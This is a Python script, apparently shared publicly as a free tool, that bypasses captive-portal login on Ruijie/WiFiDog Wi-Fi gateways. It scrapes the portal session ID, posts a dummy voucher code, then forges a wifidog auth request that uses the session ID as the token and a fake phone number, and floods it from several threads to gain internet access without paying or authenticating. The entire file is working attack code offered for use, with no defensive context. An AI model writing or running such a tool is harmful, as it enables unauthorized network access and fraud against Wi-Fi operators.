#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ruijie Bypass Tool v2 - Public Free Version
(No Key System / No Google Sheets)
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# COLORS
# ===============================
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
MAGENTA = "\033[0;35m"
RESET = "\033[00m"

# ===============================
# LOGGING
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# INTERNET CHECK
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.ruijienetworks.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# BANNER
# ===============================
def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║     Ruijie Bypass Tool v2 (FREE)     ║
║     Public Edition - No Key Needed   ║
╚══════════════════════════════════════╝
{RESET}""")

# ===============================
# HIGH SPEED PING THREAD
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    ping_count = 0
    success_count = 0

    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000

            ping_count += 1
            success_count += 1

            if elapsed < 50:
                color = GREEN
            elif elapsed < 100:
                color = YELLOW
            else:
                color = RED

            print(f"{color}[✓]{RESET} SID {sid} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")

        except requests.exceptions.Timeout:
            ping_count += 1
            print(f"{RED}[X]{RESET} SID {sid} | TIMEOUT | Success: {success_count}/{ping_count}", end="\r")

        except requests.exceptions.ConnectionError:
            ping_count += 1
            print(f"{RED}[X]{RESET} SID {sid} | Connection Lost | Success: {success_count}/{ping_count}", end="\r")

        except Exception as e:
            if DEBUG:
                print(f"{RED}[!]{RESET} Error: {e}", end="\r")

        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()

    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    print(f"\n{CYAN}[*] Network Status:{RESET}")
    print("    Checking internet connectivity...")

    if check_real_internet():
        print(f"    {GREEN}[✓] Internet is already active{RESET}")

    print(f"\n{CYAN}[*] Starting portal detection...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected: {portal_host}{RESET}")

            # STEP 1 - Extract SID
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)

            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")

            # STEP 2 - Voucher Test
            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
            voucher_api = f"{portal_host}/api/auth/voucher/"

            try:
                v_res = session.post(
                    voucher_api,
                    json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                    timeout=5
                )
                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
            except:
                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")

            # STEP 3 - Build Auth Link
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
            print(f"{CYAN}[*] Target: {gw_addr}:{gw_port}{RESET}")
            print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")

            threads = []
            for i in range(PING_THREADS):
                t = threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                )
                t.start()
                threads.append(t)

            last_status = False

            while not stop_event.is_set():
                is_connected = check_real_internet()

                if is_connected and not last_status:
                    print(f"\n{GREEN}[✓] Internet Connected!{RESET}")
                elif not is_connected and last_status:
                    print(f"\n{RED}[X] Internet Disconnected! Reconnecting...{RESET}")

                last_status = is_connected
                time.sleep(2)

        except KeyboardInterrupt:
            raise
        except Exception as e:
            if DEBUG:
                logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

# ===============================
# ENTRY POINT
# ===============================
if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
